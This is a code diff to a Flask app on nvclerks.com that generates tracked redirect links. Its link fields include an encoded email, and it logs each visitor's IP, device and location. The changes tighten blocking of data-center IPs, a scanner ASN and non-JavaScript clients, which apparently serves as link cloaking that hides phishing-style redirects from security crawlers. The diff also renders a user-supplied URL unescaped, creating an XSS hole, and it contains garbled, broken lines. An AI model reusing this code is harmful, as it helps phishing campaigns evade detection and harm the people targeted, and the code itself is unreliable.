@@ -122,8 +122,11 @@ def is_bot(user_agent, headers, ip, endpoint):
             logger.debug(f"IP {ip} is authenticated, skipping bot check")
             return False, "Authenticated user"
         if endpoint.startswith("/") and endpoint != "/login":
-            logger.debug(f"IP {ip} allowed for generated link {endpoint}, skipping JS verification")
-            return False, "Generated link access"
+            logger.debug(f"IP {ip} allowed for generated link {endpoint}, requiring JS verification")
+            if 'js_verified' not in session:
+                logger.warning(f"Blocked IP {ip}: Missing JS verification")
+                return True, "Missing JS verification"
+            return False, "JS verified"
         if not user_agent:
             logger.warning(f"Blocked IP {ip}: No User-Agent provided")
             return True, "Missing User-Agent"
@@ -139,30 +142,34 @@ def is_bot(user_agent, headers, ip, endpoint):
             try:
                 key = f"bot_check:{ip}"
                 count = valkey_client.get(key)
-                if count and int(count) > 10:
+                if count and int(count) > 2:
                     logger.warning(f"Blocked IP {ip}: Rapid requests")
                     return True, "Rapid requests"
                 valkey_client.incr(key)
                 valkey_client.expire(key, 60)
             except Exception as e:
                 logger.error(f"Valkey error in bot check: {str(e)}")
-        if ip.startswith(('162.249.', '5.62.', '84.39.')):
+        if ip.startswith(('162.249.', '5.62.', '84.39.', '37.19.200.')):
             logger.warning(f"Blocked IP {ip}: Data center IP range")
             return True, "Data center IP"
         if endpoint == "/login" and headers.get('Referer') and 'Mozilla' in user_agent:
             logger.debug(f"IP {ip} allowed for /login with valid headers")
             return False, "Likely human (login attempt)"
-        if 'js_verified' not in session:
-            logger.warning(f"Blocked IP {ip}: Missing JS verification")
-            return True, "Missing JS verification"
-        return False, "Human"
+        logger.warning(f"Blocked IP {ip}: Missing JS verification")
+        return True, "Missing JS verification"
     except Exception as e:
         logger.error(f"Error in is_bot for IP {ip}: {str(e)}", exc_info=True)
         return True, "Error in bot detection"
 
 def check_asn(ip):
     try:
-        logger.debug("Skipping ASN check (using ipapi.co/freegeoip.app)")
+        # Block known bot ASNs (e.g., Datacamp Limited AS212238)
+        response = requests.get(f"https://ipapi.co/{ip}/json/")
+        response.raise_for_status()
+        data = response.json()
+        if data.get('asn') == 'AS212238':
+            logger.warning(f"Blocked IP {ip}: Known bot ASN")
+            return True
         return False
     except Exception as e:
         logger.error(f"ASN check failed for IP {ip}: {str(e)}", exc_info=True)
@@ -254,7 +261,7 @@ def get_geoip(ip):
         logger.debug(f"IP: {ip}, Error: {str(e)}")
         return {"country": "Unknown", "city": "Unknown", "region": "Unknown", "lat": 0.0, "lon": 0.0, "isp": "Unknown", "timezone": "Unknown"}
 
-def rate_limit(limit=5, per=60):
+def rate_limit(limit=5, per=60, bot_limit=2):
     def decorator(f):
         @wraps(f)
         def wrapped_function(*args, **kwargs):
@@ -270,17 +277,18 @@ def rate_limit(limit=5, per=60):
                 if not valkey_client:
                     logger.warning("Valkey unavailable, skipping rate limit")
                     return f(*args, **kwargs)
+                effective_limit = bot_limit if 'js_verified' not in session else limit
                 key = f"rate_limit:{ip}:{f.__name__}"
                 current = valkey_client.get(key)
                 if current is None:
                     valkey_client.setex(key, per, 1)
-                    logger.debug(f"Rate limit set for {ip}: 1/{limit}")
-                elif int(current) >= limit:
+                    logger.debug(f"Rate limit set for {ip}: 1/{effective_limit}")
+                elif int(current) >= effective_limit:
                     logger.warning(f"Rate limit exceeded for IP: {ip}")
                     abort(429, "Too Many Requests")
                 else:
                     valkey_client.incr(key)
-                    logger.debug(f"Rate limit incremented for {ip}: {int(current)+1}/{limit}")
+                    logger.debug(f"Rate limit incremented for {ip}: {int(current)+1}/{effective_limit}")
                 return f(*args, **kwargs)
             except Exception as e:
                 logger.error(f"Error in rate_limit for IP {ip}: {str(e)}")
@@ -539,6 +547,16 @@ def log_visitor():
                 })
                 valkey_client.expire(f"user:{username}:visitor:{visitor_id}", DATA_RETENTION_DAYS * 86400)
                 logger.debug(f"Logged visitor: {visitor_id} for user: {username}")
+                if is_bot_flag:
+                    bot_id = hashlib.sha256(f"{ip}{time.time()}".encode()).hexdigest()
+                    valkey_client.hset(f"user:{username}:bot:{bot_id}", mapping={
+                        "timestamp": int(time.time()),
+                        "ip": encrypted_ip,
+                        "user_agent": encrypted_ua,
+                        "block_reason": bot_reason
+                    })
+                    valkey_client.expire(f"user:{username}:bot:{bot_id}", DATA_RETENTION_DAYS * 86400)
+                    logger.debug(f"Logged bot attempt: {bot_id} for user: {username}")
             except Exception as e:
                 logger.error(f"Valkey error logging visitor: {str(e)}")
     except Exception as e:
@@ -778,7 +796,7 @@ def dashboard():
 
         if request.method == "POST" and form.validate_on_submit():
             logger.debug(f"Processing POST form data: {form.data}")
-            subdomain = form.subdomain.data.strip()
+            subdomain = form.subdomain.data.strip().lower()
             randomstring1 = form.randomstring1.data.strip()
             base64email = form.base64email.data.strip()
             destination_link = form.destination_link.data.strip()
@@ -789,7 +807,7 @@ def dashboard():
             if not re.match(r"^https?://", destination_link):
                 error = "Invalid URL"
                 logger.warning(f"Invalid destination_link: {destination_link}")
-            elif not (2 <= len(subdomain) <= 100 and re.match(r"^[A-Za-z0-9-]{2,100}$", subdomain)):
+            elif not (2 <= len(subdomain) <= 100 and re.match(r"^[a-z0-9-]{2,100}$", subdomain)):
                 error = "Subdomain must be 2-100 characters (letters, numbers, or hyphens)"
                 logger.warning(f"Invalid subdomain: {subdomain}")
             elif not (2 <= len(randomstring1) <= 100 and re.match(r"^[A-Za-z0-9_@.]{2,100}$", randomstring1)):
@@ -838,8 +856,8 @@ def dashboard():
                     error = "Failed to encrypt payload"
 
                 if not error:
-                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}"
-                    url_id = hashlib.sha256(generated_url.encode()).hexdigest()
+                    generated_url = f"https://{urllib.parse.quote(subdomain.lower())}.{base_domain}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}"
+                    url_id = hashlib.sha256(generated_url.lower().encode()).hexdigest()
                     if valkey_client:
                         try:
                             valkey_client.hset(f"user:{username}:url:{url_id}", mapping={
@@ -853,8 +871,8 @@ def dashboard():
                                 "disabled": "0"
                             })
                             valkey_client.expire(f"user:{username}:url:{url_id}", DATA_RETENTION_DAYS * 86400)
-                            logger.info(f"Generated URL for {username}: {generated_url}")
-                            success = "URL generated successfully"
+                            logger.info(f"Generated URL for {username}: {generated_url}, url_id: {url_id}")
+                            success = f"URL generated successfully: <a href='{generated_url}' target='_blank'>{generated_url}</a>"
                         except Exception as e:
                             logger.error(f"Valkey error storing URL: {str(e)}")
                             error = "Failed to store URL in database"
@@ -973,7 +991,7 @@ def dashboard():
                     except Exception as e:
                         logger.error(f"Error processing visitor key {key}: {str(e)}")
                 for url in urls:
-                    access_keys = valkey_client.keys(f"user:{username}:url:{url['id']}:access")
+                    access_keys = valkey_client.keys(f"user:{username}:url:{url['id']}:access:*")
                     for key in access_keys:
                         try:
                             access_data = valkey_client.hgetall(key)
@@ -1139,7 +1157,7 @@ def dashboard():
                         <p class="error p-4 mb-4 text-center rounded-lg">{{ error }}</p>
                     {% endif %}
                     {% if success %}
-                        <p class="success p-4 mb-4 text-center rounded-lg">{{ success }}</p>
+                        <p class="success p-4 mb-4 text-center rounded-lg">{{ success | safe }}</p>
                     {% endif %}
                     {% if valkey_error %}
                         <p class="error p-4 mb-4 text-center rounded-lg">{{ valkey_error }}</p>
@@ -1259,9 +1277,10 @@ def dashboard():
                                                     <option value="App">App</option>
                                                 </select>
                                             </div>
+                                            </div>
                                             <a href="/export/{{ loop.index }}" class="mt-4 inline-block bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export as CSV</a>
                                             <div class="table-container mt-4">
-                                                <table>
+                                                <table id="visits-{{ loop.index }}">
                                                     <thead>
                                                         <tr class="bg-gray-200">
                                                             <th>Timestamp</th>
@@ -1412,7 +1431,7 @@ def dashboard():
                                 <p class="text-gray-600">No bot detections logged.</p>
                             {% endif %}
                         </div>
-                   </div>
+                    </div>
                     <div id="access-logs-tab" class="tab-content hidden">
                         <div class="bg-white p-8 rounded-xl card">
                             <h2 class="text-2xl font-bold mb-6 text-gray-900">Link Access Logs</h2>
@@ -1730,10 +1749,9 @@ def export_visitors():
 def export(index):
     try:
         username = session['username']
-        logger.debug(f"Exporting data for user: {username}, session: {session}")
+        logger.debug(f"Exporting data for user: {username}, index: {index}")
         if valkey_client:
             try:
-                logger.debug(f"Fetching URL keys for export, user: {username}")
                 url_keys = valkey_client.keys(f"user:{username}:url:*")
                 if index <= 0 or index > len(url_keys):
                     logger.warning(f"Invalid export index {index} for user {username}")
@@ -1757,7 +1775,7 @@ def export(index):
                         visit.get('device', 'Unknown'),
                         visit.get('app', 'Unknown'),
                         visit.get('type', 'Unknown'),
-                        visit.get('location', {}).get('country', 'Unknown'),
+                        visit.get('location', {}).get('country TEAM A', 'Unknown'),
                         visit.get('location', {}).get('city', 'Unknown')
                     ])
                 output.seek(0)
@@ -1839,7 +1857,7 @@ def delete_url(url_id):
             try:
                 valkey_client.delete(f"user:{username}:url:{url_id}")
                 valkey_client.delete(f"user:{username}:url:{url_id}:visits")
-                valkey_client.delete(f"user:{username}:url:{url_id}:access")
+                valkey_client.delete(f"user:{username}:url:{url_id}:access:*")
                 logger.info(f"Deleted URL {url_id} for user: {username}")
                 return redirect(url_for('dashboard'))
             except Exception as e:
@@ -2088,7 +2106,7 @@ def favicon():
     return "", 204
 
 @app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"], subdomain="<username>")
-@rate_limit(limit=5, per=60)
+@rate_limit(limit=5, per=60, bot_limit=2)
 def redirect_handler(username, endpoint, encrypted_payload, path_segment):
     try:
         base_domain = "nvclerks.com"
@@ -2103,7 +2121,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                      f"IP={ip}, User-Agent={user_agent}, URL={request.url}")
 
         # Normalize URL for consistent url_id
-        normalized_url = f"https://{username.lower()}.{base_domain}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}"
+        normalized_url = f"https://{username.lower()}.{base_domain}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}".lower()
         url_id = hashlib.sha256(normalized_url.encode()).hexdigest()
         logger.debug(f"Normalized URL: {normalized_url}, url_id: {url_id}")
 
@@ -2146,69 +2164,84 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                         "success": "0",
                         "reason": bot_reason
                     })
+                    bot_id = hashlib.sha256(f"{ip}{time.time()}".encode()).hexdigest()
+                    valkey_client.hset(f"user:{username}:bot:{bot_id}", mapping={
+                        "timestamp": int(time.time()),
+                        "ip": encrypt_signed_token(ip),
+                        "user_agent": encrypt_signed_token(user_agent[:100]),
+                        "block_reason": bot_reason
+                    })
+                    valkey_client.expire(f"user:{username}:bot:{bot_id}", DATA_RETENTION_DAYS * 86400)
+                    logger.debug(f"Logged bot attempt: {bot_id} for user: {username}")
                 except Exception as e:
-                    logger.error(f"Valkey error updating access log: {str(e)}")
+                    logger.error(f"Valkey error updating access or bot log: {str(e)}")
             abort(403, f"Access denied: {bot_reason}")
 
         if valkey_client:
-            try:
-                logger.debug(f"Checking URL key: user:{username}:url:{url_id}")
-                url_data = valkey_client.hgetall(f"user:{username}:url:{url_id}")
-                logger.debug(f"Retrieved URL data for {url_id}: {url_data}")
-                if not url_data:
-                    logger.warning(f"URL {url_id} not found in Valkey")
-                    valkey_client.hset(f"user:{username}:url:{url_id}:access:{access_id}", mapping={
-                        "success": "0",
-                        "reason": "URL not found"
-                    })
-                    abort(404, "URL not found")
-                if url_data.get('disabled', '0') == '1':
-                    logger.warning(f"URL {url_id} is disabled")
-                    valkey_client.hset(f"user:{username}:url:{url_id}:access:{access_id}", mapping={
-                        "success": "0",
-                        "reason": "URL disabled"
-                    })
-                    abort(403, "URL is disabled")
-                ip_whitelist = json.loads(url_data.get('ip_whitelist', '[]'))
-                if ip_whitelist:
-                    allowed = False
-                    for ip_range in ip_whitelist:
-                        try:
-                            if ip_address(ip) in ip_network(ip_range):
-                                allowed = True
-                                break
-                        except ValueError:
-                            continue
-                    if not allowed:
-                        logger.warning(f"IP {ip} not in whitelist for URL {url_id}")
+            max_retries = 2
+            for attempt in range(max_retries):
+                try:
+                    logger.debug(f"Checking URL key: user:{username}:url:{url_id}, attempt {attempt+1}")
+                    url_data = valkey_client.hgetall(f"user:{username}:url:{url_id}")
+                    logger.debug(f"Retrieved URL data for {url_id}: {url_data}")
+                    if not url_data:
+                        logger.warning(f"URL {url_id} not found in Valkey for user {username}")
                         valkey_client.hset(f"user:{username}:url:{url_id}:access:{access_id}", mapping={
                             "success": "0",
-                            "reason": "IP not whitelisted"
+                            "reason": "URL not found"
                         })
-                        abort(403, "IP not whitelisted")
-            except Exception as e:
-                logger.error(f"Valkey error checking URL {url_id}: {str(e)}")
-                valkey_client.hset(f"user:{username}:url:{url_id}:access:{access_id}", mapping={
-                    "success": "0",
-                    "reason": f"Valkey error: {str(e)}"
-                })
-                return render_template_string("""
-                    <!DOCTYPE html>
-                    <html lang="en">
-                    <head>
-                        <meta charset="UTF-8">
-                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                        <title>Database Error</title>
-                        <script src="https://cdn.tailwindcss.com"></script>
-                    </head>
-                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                            <h3 class="text-lg font-bold mb-4 text-red-600">Database Error</h3>
-                            <p class="text-gray-600">Unable to access URL data. Please try again later.</p>
-                        </div>
-                    </body>
-                    </html>
-                """), 500
+                        abort(404, "URL not found")
+                    if url_data.get('disabled', '0') == '1':
+                        logger.warning(f"URL {url_id} is disabled for user {username}")
+                        valkey_client.hset(f"user:{username}:url:{url_id}:access:{access_id}", mapping={
+                            "success": "0",
+                            "reason": "URL disabled"
+                        })
+                        abort(403, "URL is disabled")
+                    ip_whitelist = json.loads(url_data.get('ip_whitelist', '[]'))
+                    if ip_whitelist:
+                        allowed = False
+                        for ip_range in ip_whitelist:
+                            try:
+                                if ip_address(ip) in ip_network(ip_range):
+                                    allowed = True
+                                    break
+                            except ValueError:
+                                continue
+                        if not allowed:
+                            logger.warning(f"IP {ip} not in whitelist for URL {url_id}")
+                            valkey_client.hset(f"user:{username}:url:{url_id}:access:{access_id}", mapping={
+                                "success": "0",
+                                "reason": "IP not whitelisted"
+                            })
+                            abort(403, "IP not whitelisted")
+                    break
+                except Exception as e:
+                    logger.error(f"Valkey error checking URL {url_id} on attempt {attempt+1}: {str(e)}")
+                    if attempt < max_retries - 1:
+                        time.sleep(0.5)
+                        continue
+                    valkey_client.hset(f"user:{username}:url:{url_id}:access:{access_id}", mapping={
+                        "success": "0",
+                        "reason": f"Valkey error: {str(e)}"
+                    })
+                    return render_template_string("""
+                        <!DOCTYPE html>
+                        <html lang="en">
+                        <head>
+                            <meta charset="UTF-8">
+                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                            <title>Database Error</title>
+                            <script src="https://cdn.tailwindcss.com"></script>
+                        </head>
+                        <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                            <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                                <h3 class="text-lg font-bold mb-4 text-red-600">Database Error</h3>
+                                <p class="text-gray-600">Unable to access URL data. Please try again later.</p>
+                            </div>
+                        </body>
+                        </html>
+                    """), 500
         else:
             logger.warning("Valkey unavailable for URL check")
             valkey_client.hset(f"user:{username}:url:{url_id}:access:{access_id}", mapping={
@@ -2343,7 +2376,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                     try:
                         valkey_client.delete(f"user:{username}:url:{url_id}")
                         valkey_client.delete(f"user:{username}:url:{url_id}:visits")
-                        valkey_client.delete(f"user:{username}:url:{url_id}:access")
+                        valkey_client.delete(f"user:{username}:url:{url_id}:access:*")
                         logger.info(f"Deleted expired URL: {url_id}")
                     except Exception as e:
                         logger.error(f"Valkey error deleting expired URL: {str(e)}")
@@ -2397,7 +2430,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
         """, error=error_message), 500
 
 @app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"])
-@rate_limit(limit=5, per=60)
+@rate_limit(limit=5, per=60, bot_limit=2)
 def redirect_handler_no_subdomain(endpoint, encrypted_payload, path_segment):
     try:
         host = request.host
